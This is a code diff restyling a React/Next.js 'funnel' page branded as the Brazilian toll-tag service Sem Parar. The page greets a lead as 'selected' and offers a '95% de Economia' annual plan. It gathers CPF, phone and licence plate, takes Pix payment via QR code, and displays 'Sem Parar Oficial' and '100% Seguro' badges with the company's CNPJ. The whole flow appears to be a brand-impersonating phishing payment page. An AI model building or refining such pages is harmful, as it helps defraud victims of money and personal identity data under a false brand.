@@ -100,234 +100,235 @@ export default function FunnelClient({ lead }: { lead: LeadData }) {
     return () => clearInterval(interval);
   }, [pixData?.id, paymentStatus]);
 
-  const brandColor = '#B91244';
-
   return (
     <div className="min-h-screen bg-white flex flex-col">
       {/* Header */}
-      <header className="bg-white border-b border-[#e6e6e6]">
-        <div className="max-w-[500px] mx-auto px-4 py-3 flex items-center justify-center">
-          <Image src="/logo.png" alt="Sem Parar" width={100} height={28} className="h-7 w-auto" />
+      <header className="border-b border-[#e6e6e6]">
+        <div className="max-w-[1200px] mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
+          <Image src="/logo.png" alt="Sem Parar" width={120} height={32} className="h-8 w-auto" />
+          <div className="hidden sm:flex items-center gap-6 text-sm text-[#0e0d0d]">
+            <span>Para voce</span>
+            <span>Para empresas</span>
+          </div>
         </div>
       </header>
 
-      {/* PASSO 2: Pagina da Oferta */}
+      {/* PAGINA DA OFERTA */}
       {step === 'offer' && (
-        <main className="flex-1 max-w-[500px] mx-auto px-4 py-6 w-full">
-          {/* Card principal */}
-          <div className="border border-[#e6e6e6] rounded-2xl p-6">
-            {/* Badge */}
-            <div className="text-center mb-4">
-              <span
-                className="inline-block text-white text-xs font-semibold px-4 py-1.5 rounded-full"
-                style={{ backgroundColor: brandColor }}
-              >
-                OFERTA EXCLUSIVA
-              </span>
-            </div>
+        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
+          {/* Badge */}
+          <div className="text-center mb-6">
+            <span className="inline-block bg-[#d60b52] text-white text-xs font-semibold px-4 py-1.5 rounded-full">
+              OFERTA EXCLUSIVA
+            </span>
+          </div>
 
-            {/* Titulo */}
-            <h1 className="text-[#0e0d0d] text-xl font-bold text-center mb-4">
-              {lead.firstName.toUpperCase()}, VOCE FOI SELECIONADO!
+          {/* Titulo */}
+          <div className="text-center mb-8">
+            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-4">
+              {lead.firstName}, voce foi selecionado!
             </h1>
 
-            {/* Preco */}
-            <div className="text-center mb-2">
-              <p className="text-4xl font-bold" style={{ color: brandColor }}>
+            {/* Preco destaque */}
+            <div className="mb-2">
+              <span className="text-[#d60b52] text-5xl sm:text-6xl font-bold">
                 R$ {promoPrice.toFixed(2).replace('.', ',')}
-              </p>
-              <p className="text-[#0e0d0d] text-base mt-1">pelo ano inteiro</p>
-              <p className="text-[#666] text-sm mt-1">
-                De R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes • 95% de Economia
-              </p>
+              </span>
             </div>
-
-            {/* Beneficios Grid 2x2 */}
-            <div className="grid grid-cols-2 gap-3 my-6">
-              {[
-                { icon: '🚗', title: '1 ANO SEM', subtitle: 'PEDAGIO' },
-                { icon: '🅿️', title: '1 ANO SEM', subtitle: 'ESTACIONAMENTO' },
-                { icon: '🍔', title: '30% OFF', subtitle: "McDONALD'S" },
-                { icon: '⛽', title: '-R$ 0,20', subtitle: '/LITRO' },
-              ].map((item, i) => (
-                <div key={i} className="bg-[#f8f8f8] rounded-xl p-4 text-center">
-                  <span className="text-2xl mb-1 block">{item.icon}</span>
-                  <p className="text-[#0e0d0d] text-xs font-bold">{item.title}</p>
-                  <p className="text-[#0e0d0d] text-xs font-bold">{item.subtitle}</p>
-                </div>
-              ))}
-            </div>
-
-            {/* CTA */}
-            <button
-              onClick={() => setStep('checkout')}
-              className="w-full text-white font-semibold text-sm py-4 rounded-lg transition-colors hover:opacity-90"
-              style={{ backgroundColor: brandColor }}
-            >
-              QUERO APROVEITAR ESTA OFERTA
-            </button>
+            <p className="text-[#0e0d0d] text-lg font-medium mb-1">pelo ano inteiro</p>
+            <p className="text-[#666] text-sm">
+              De R$ {mensalidadeAtual.toFixed(2).replace('.', ',')}/mes • 95% de Economia
+            </p>
           </div>
+
+          {/* Beneficios Grid */}
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 mb-8">
+            {[
+              { icon: '🚗', line1: '1 Ano Sem', line2: 'Pedagio' },
+              { icon: '🅿️', line1: '1 Ano Sem', line2: 'Estacionamento' },
+              { icon: '🍔', line1: '30% OFF', line2: "McDonald's" },
+              { icon: '⛽', line1: '-R$ 0,20', line2: '/Litro' },
+            ].map((item, i) => (
+              <div key={i} className="bg-[#f8f8f8] rounded-xl p-5 text-center">
+                <span className="text-3xl mb-2 block">{item.icon}</span>
+                <p className="text-[#0e0d0d] text-sm font-semibold">{item.line1}</p>
+                <p className="text-[#0e0d0d] text-sm font-semibold">{item.line2}</p>
+              </div>
+            ))}
+          </div>
+
+          {/* CTA */}
+          <button
+            onClick={() => setStep('checkout')}
+            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors"
+          >
+            Quero aproveitar esta oferta
+          </button>
         </main>
       )}
 
-      {/* PASSO 3: Checkout */}
+      {/* CHECKOUT / PAGAMENTO */}
       {step === 'checkout' && (
-        <main className="flex-1 max-w-[500px] mx-auto px-4 py-6 w-full">
-          {/* Card principal */}
-          <div className="border border-[#e6e6e6] rounded-2xl p-6">
-            {/* Titulo */}
-            <h1 className="text-[#0e0d0d] text-lg font-bold text-center mb-6">
-              Finalize seu Sem Parar<br/>Black Friday
+        <main className="flex-1 max-w-[800px] mx-auto px-4 py-8 sm:py-12 w-full">
+          {/* Titulo */}
+          <div className="text-center mb-8">
+            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold leading-tight mb-3">
+              Finalize seu Sem Parar Black Friday
             </h1>
+          </div>
 
-            {/* Resumo */}
-            <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6 flex items-center justify-between">
+          {/* Resumo do plano */}
+          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6">
+            <div className="flex items-center justify-between">
               <div>
-                <p className="text-[#0e0d0d] text-sm font-medium">Plano Anual +</p>
-                <p className="text-[#0e0d0d] text-sm font-medium">4 Beneficios Black Friday</p>
+                <p className="text-[#0e0d0d] font-semibold">Plano Anual +</p>
+                <p className="text-[#666] text-sm">4 Beneficios Black Friday</p>
               </div>
-              <p className="text-[#0e0d0d] text-xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
+              <p className="text-[#d60b52] text-2xl font-bold">R$ {promoPrice.toFixed(2).replace('.', ',')}</p>
             </div>
+          </div>
 
+          {/* Formulario */}
+          <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6">
             {/* Dados Pessoais */}
-            <div className="mb-4">
-              <p className="text-[#0e0d0d] text-sm font-semibold mb-2">Dados Pessoais</p>
-              <div className="grid grid-cols-2 gap-3">
+            <div className="mb-6">
+              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Dados Pessoais</p>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                 <input
                   type="text"
                   value={formData.cpf}
                   onChange={(e) => setFormData({ ...formData, cpf: e.target.value })}
-                  className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244]"
+                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                   placeholder="CPF"
                 />
                 <input
                   type="text"
                   value={formData.telefone}
                   onChange={(e) => setFormData({ ...formData, telefone: e.target.value })}
-                  className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244]"
+                  className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                   placeholder="Telefone"
                 />
               </div>
             </div>
 
             {/* Dados do Veiculo */}
-            <div className="mb-4">
-              <p className="text-[#0e0d0d] text-sm font-semibold mb-2">Dados do Veiculo</p>
+            <div className="mb-6">
+              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Dados do Veiculo</p>
               <input
                 type="text"
                 value={formData.placa}
                 onChange={(e) => setFormData({ ...formData, placa: e.target.value })}
-                className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244]"
+                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52]"
                 placeholder="Placa"
               />
             </div>
 
             {/* Forma de Pagamento */}
-            <div className="mb-6">
-              <p className="text-[#0e0d0d] text-sm font-semibold mb-2">Forma de Pagamento</p>
+            <div>
+              <p className="text-[#0e0d0d] text-sm font-semibold mb-3">Forma de Pagamento</p>
               <select
                 value={formData.paymentMethod}
                 onChange={(e) => setFormData({ ...formData, paymentMethod: e.target.value })}
-                className="w-full border border-[#e6e6e6] rounded-lg px-3 py-2.5 text-[#0e0d0d] text-sm focus:outline-none focus:border-[#B91244] bg-white"
+                className="w-full border border-[#e6e6e6] rounded-lg px-4 py-3 text-[#0e0d0d] focus:outline-none focus:border-[#d60b52] bg-white"
               >
                 <option value="pix">Pix</option>
                 <option value="cartao">Cartao</option>
               </select>
             </div>
-
-            {/* QR Code PIX */}
-            {pixData && (
-              <div className="bg-[#f8f8f8] rounded-xl p-4 mb-6 text-center">
-                {pixData.qrCodeBase64 && (
-                  <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-36 h-36 mx-auto mb-3" />
-                )}
-                <div className="flex gap-2">
-                  <code className="flex-1 text-[#0e0d0d] text-xs bg-white border border-[#e6e6e6] rounded-lg p-2 text-left truncate">
-                    {pixData.copyPaste}
-                  </code>
-                  <button
-                    onClick={handleCopyPix}
-                    className="text-white text-xs font-semibold px-3 py-2 rounded-lg"
-                    style={{ backgroundColor: brandColor }}
-                  >
-                    {copied ? '✓' : 'Copiar'}
-                  </button>
-                </div>
-                <p className="text-[#666] text-xs mt-3 flex items-center justify-center gap-2">
-                  <span className="w-2 h-2 bg-[#f59e0b] rounded-full animate-pulse"></span>
-                  Aguardando pagamento...
-                </p>
-              </div>
-            )}
-
-            {/* Selos */}
-            <div className="flex items-center justify-center gap-4 mb-6 text-xs text-[#666]">
-              <span className="flex items-center gap-1">
-                <span className="text-green-600">🔒</span> Ambiente 100% Seguro
-              </span>
-              <span className="flex items-center gap-1">
-                <span style={{ color: brandColor }}>✓</span> Sem Parar Oficial
-              </span>
-            </div>
-
-            {/* CTA */}
-            <button
-              onClick={handleConfirm}
-              disabled={loading || !formData.cpf}
-              className="w-full text-white font-semibold text-sm py-4 rounded-lg transition-colors hover:opacity-90 disabled:opacity-50"
-              style={{ backgroundColor: brandColor }}
-            >
-              {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
-            </button>
           </div>
+
+          {/* QR Code PIX */}
+          {pixData && (
+            <div className="bg-white border border-[#e6e6e6] rounded-xl p-6 mb-6 text-center">
+              <p className="text-[#0e0d0d] font-semibold mb-4">Escaneie o QR Code ou copie o codigo</p>
+              {pixData.qrCodeBase64 && (
+                <img src={`data:image/png;base64,${pixData.qrCodeBase64}`} alt="QR Code" className="w-48 h-48 mx-auto mb-4" />
+              )}
+              <div className="flex gap-3 max-w-md mx-auto">
+                <code className="flex-1 text-[#0e0d0d] text-xs bg-[#f8f8f8] border border-[#e6e6e6] rounded-lg p-3 text-left truncate">
+                  {pixData.copyPaste}
+                </code>
+                <button
+                  onClick={handleCopyPix}
+                  className="bg-[#0e0d0d] hover:bg-[#333] text-white font-semibold px-4 py-2 rounded-lg transition-colors"
+                >
+                  {copied ? 'Copiado!' : 'Copiar'}
+                </button>
+              </div>
+              <p className="text-[#666] text-sm mt-4 flex items-center justify-center gap-2">
+                <span className="w-2 h-2 bg-[#fbbf24] rounded-full animate-pulse"></span>
+                Aguardando pagamento...
+              </p>
+            </div>
+          )}
+
+          {/* Selos de seguranca */}
+          <div className="flex items-center justify-center gap-8 mb-6">
+            <div className="flex items-center gap-2 text-[#666] text-sm">
+              <span className="text-[#16a34a]">🔒</span>
+              <span>Ambiente 100% Seguro</span>
+            </div>
+            <div className="flex items-center gap-2 text-[#666] text-sm">
+              <span className="text-[#d60b52]">✓</span>
+              <span>Sem Parar Oficial</span>
+            </div>
+          </div>
+
+          {/* CTA */}
+          <button
+            onClick={handleConfirm}
+            disabled={loading || !formData.cpf}
+            className="w-full bg-[#d60b52] hover:bg-[#b20944] text-white font-semibold text-base py-4 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-4"
+          >
+            {loading ? 'Processando...' : `Confirmar e Pagar R$ ${promoPrice.toFixed(2).replace('.', ',')}`}
+          </button>
 
           <button
             onClick={() => setStep('offer')}
-            className="w-full text-[#666] text-sm py-3 hover:text-[#0e0d0d] transition-colors"
+            className="w-full text-[#666] text-sm py-2 hover:text-[#0e0d0d] transition-colors"
           >
             ← Voltar
           </button>
         </main>
       )}
 
-      {/* PASSO 4: Confirmacao */}
+      {/* CONFIRMACAO & ATIVACAO */}
       {step === 'success' && (
-        <main className="flex-1 max-w-[500px] mx-auto px-4 py-10 w-full">
+        <main className="flex-1 max-w-[800px] mx-auto px-4 py-10 sm:py-16 w-full">
           {/* Check icon */}
-          <div className="text-center mb-6">
-            <div className="w-16 h-16 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto">
-              <span className="text-[#16a34a] text-3xl">✓</span>
-            </div>
-          </div>
-
-          {/* Titulo */}
           <div className="text-center mb-8">
-            <h1 className="text-[#0e0d0d] text-2xl font-bold mb-2">
+            <div className="w-20 h-20 bg-[#dcfce7] rounded-full flex items-center justify-center mx-auto mb-6">
+              <span className="text-[#16a34a] text-4xl">✓</span>
+            </div>
+            <h1 className="text-[#0e0d0d] text-2xl sm:text-[32px] font-bold mb-2">
               Assinatura Confirmada!
             </h1>
-            <p className="text-[#666] text-base">
+            <p className="text-[#666] text-lg">
               Beneficios Black Friday Ativos
             </p>
           </div>
 
           {/* Proximos passos */}
-          <div className="space-y-4">
-            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-4">
-              <span className="text-2xl">📦</span>
+          <div className="max-w-md mx-auto space-y-4">
+            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
+              <span className="text-3xl">📦</span>
               <div>
-                <p className="text-[#0e0d0d] font-medium text-sm">Envio da TAG para seu endereco</p>
+                <p className="text-[#0e0d0d] font-semibold">Envio da TAG para seu endereco</p>
+                <p className="text-[#666] text-sm">Chegara em ate 7 dias uteis</p>
               </div>
             </div>
-            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-4">
-              <span className="text-2xl">📱</span>
+            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
+              <span className="text-3xl">📱</span>
               <div>
-                <p className="text-[#0e0d0d] font-medium text-sm">Acesso imediato no App Sem Parar</p>
+                <p className="text-[#0e0d0d] font-semibold">Acesso imediato no App Sem Parar</p>
+                <p className="text-[#666] text-sm">Baixe na App Store ou Google Play</p>
               </div>
             </div>
-            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-4">
-              <span className="text-2xl">✉️</span>
+            <div className="flex items-center gap-4 bg-[#f8f8f8] rounded-xl p-5">
+              <span className="text-3xl">✉️</span>
               <div>
-                <p className="text-[#0e0d0d] font-medium text-sm">Comprovante enviado por E-mail</p>
+                <p className="text-[#0e0d0d] font-semibold">Comprovante enviado por E-mail</p>
+                <p className="text-[#666] text-sm">Verifique sua caixa de entrada</p>
               </div>
             </div>
           </div>
@@ -335,10 +336,11 @@ export default function FunnelClient({ lead }: { lead: LeadData }) {
       )}
 
       {/* Footer */}
-      <footer className="border-t border-[#e6e6e6] py-4 mt-auto">
-        <div className="max-w-[500px] mx-auto px-4 text-center">
+      <footer className="border-t border-[#e6e6e6] mt-auto">
+        <div className="max-w-[800px] mx-auto px-4 py-6 text-center">
+          <Image src="/logo.png" alt="Sem Parar" width={80} height={24} className="h-6 w-auto mx-auto mb-4 opacity-50" />
           <p className="text-[#999] text-xs">
-            Sem Parar · DBTrans Internet Ltda.
+            DBTrans Internet Ltda. · CNPJ 10.558.633/0001-61
           </p>
         </div>
       </footer>
